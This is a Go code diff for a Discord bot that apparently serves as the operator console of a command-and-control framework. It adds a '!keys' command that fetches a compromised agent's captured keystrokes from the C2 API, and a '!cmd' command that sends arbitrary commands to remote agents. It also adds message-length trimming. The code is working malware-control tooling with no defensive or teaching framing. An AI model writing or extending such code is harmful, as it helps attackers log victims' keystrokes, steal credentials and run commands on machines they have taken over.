@@ -1,12 +1,14 @@
 package command
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"regexp"
 	"strings"
 	"time"
 
@@ -83,7 +85,17 @@ func GetBotAgents() *discordgo.MessageSend {
 	}
 	// fmt.Println(results.String())
 
-	return sendAgentMessage(results.String()[:len([]rune(results.String()))], "Agent Info")
+	// trims charaters
+	if len([]rune(results.String())) <= 4096 {
+		if results.String() == "" {
+			return sendAgentMessage("Nothing yet!", "Empty!")
+		} else {
+			return sendAgentMessage(results.String()[:len([]rune(results.String()))], "Agent Info")
+		}
+	} else {
+		return sendAgentMessage(results.String()[:4093]+"...", "Agent Info")
+
+	}
 }
 
 func GetBotAgent(message string) *discordgo.MessageSend {
@@ -138,8 +150,109 @@ func GetBotAgent(message string) *discordgo.MessageSend {
 			return sendAgentMessage(results.String()[:len([]rune(results.String()))], "Agent: "+botmsg[1])
 		}
 	} else {
+		return sendAgentMessage(results.String()[:4093]+"...", "Agent: "+botmsg[1])
+	}
+}
+
+func GetBotKeys(message string) *discordgo.MessageSend {
+	apiserver := goDotEnvVariable("WEBSERVER_IP")
+	apiport := goDotEnvVariable("WEBSERVER_PORT")
+	botmsg := strings.Split(message, " ")
+
+	if len(botmsg) <= 1 {
 		return &discordgo.MessageSend{
-			Content: "Charater limit reached (> 4096)",
+			Content: "Error! Invalid syntax `!keys <uuid>`",
 		}
+	}
+	// fmt.Println(botmsg)
+	if !IsValidUUID(botmsg[1]) {
+		return &discordgo.MessageSend{
+			Content: "Error! Invalid uuid",
+		}
+	}
+
+	apiURL := fmt.Sprintf("http://%s:%s/api/keylog/%s", apiserver, apiport, botmsg[1])
+	// fmt.Println(apiURL)
+	// Create new HTTP client & set timeout
+	client := http.Client{Timeout: 5 * time.Second}
+
+	// Query C2 API
+	response, err := client.Get(apiURL)
+	if err != nil {
+		return &discordgo.MessageSend{
+			Content: "Http api Error! trying to get agent",
+		}
+	}
+
+	// Open HTTP response body
+	body, _ := ioutil.ReadAll(response.Body)
+	defer response.Body.Close()
+
+	// Convert JSON
+	var data types.KeyReceiveBot
+	json.Unmarshal([]byte(body), &data)
+	// fmt.Println(data[0].Keys)
+	var results strings.Builder
+	fmt.Fprintf(&results, "`Keylog:` %s", data[0].Keys)
+	//fmt.Println(results.String())
+
+	// trims charaters
+	if len([]rune(results.String())) <= 4096 {
+		if results.String() == "" {
+			return sendAgentMessage("No Keys yet!", "Agent: "+botmsg[1])
+		} else {
+			return sendAgentMessage(results.String()[:len([]rune(results.String()))], "Agent: "+botmsg[1])
+		}
+	} else {
+		return sendAgentMessage(results.String()[:4093]+"...", "Agent: "+botmsg[1])
+	}
+}
+
+func PostBotCmd(message string) *discordgo.MessageSend {
+	apiserver := goDotEnvVariable("WEBSERVER_IP")
+	apiport := goDotEnvVariable("WEBSERVER_PORT")
+	botmsg := strings.Split(message, " ")
+
+	if len(botmsg) <= 1 {
+		return &discordgo.MessageSend{
+			Content: "Error! Invalid syntax `!cmd <uuid> ^command^`",
+		}
+	}
+	// fmt.Println(botmsg)
+	if !IsValidUUID(botmsg[1]) {
+		return &discordgo.MessageSend{
+			Content: "Error! Invalid uuid",
+		}
+	}
+
+	commandraw := message
+	re := regexp.MustCompile(`\^(.*?)\^`)
+	command := re.FindStringSubmatch(commandraw)
+
+	if len(command) > 2 || len(command) == 0 {
+		return &discordgo.MessageSend{
+			Content: "Error! Invalid command syntax \nUse !cmd <uuid> ^command^",
+		}
+	}
+
+	requestBody := types.BotCommand{Command: command[1]}
+	jsonValue, _ := json.Marshal(requestBody)
+
+	apiURL := fmt.Sprintf("http://%s:%s/api/agent/%s", apiserver, apiport, botmsg[1])
+	// fmt.Println(apiURL)
+	// Create new HTTP client & set timeout
+	client := http.Client{Timeout: 5 * time.Second}
+
+	// Query C2 API
+
+	_, err := client.Post(apiURL, "application/json", bytes.NewBuffer(jsonValue))
+	if err != nil {
+		return &discordgo.MessageSend{
+			Content: "Http api Error! trying to post cmd",
+		}
+	}
+
+	return &discordgo.MessageSend{
+		Content: "!refresh " + botmsg[1],
 	}
 }
